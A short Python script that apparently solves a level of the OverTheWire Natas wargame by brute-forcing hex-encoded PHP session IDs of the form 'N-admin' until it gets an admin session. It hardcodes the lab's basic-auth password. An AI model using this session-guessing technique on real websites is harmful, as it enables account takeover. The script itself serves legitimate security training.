import requests, binascii
from requests.auth import HTTPBasicAuth

sessid = ""

for i in range(1,1000):
	sessid = binascii.hexlify(("%d-admin" % i).encode("ascii")).decode("ascii")
	
	r = requests.get("http://natas19.natas.labs.overthewire.org/", cookies={"PHPSESSID":sessid}, auth=HTTPBasicAuth('natas19','4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')) 
	if(r.text.find("You are an admin") != -1):
		print(r.text)
		break
	else:
		print("try : " + sessid + " failed")	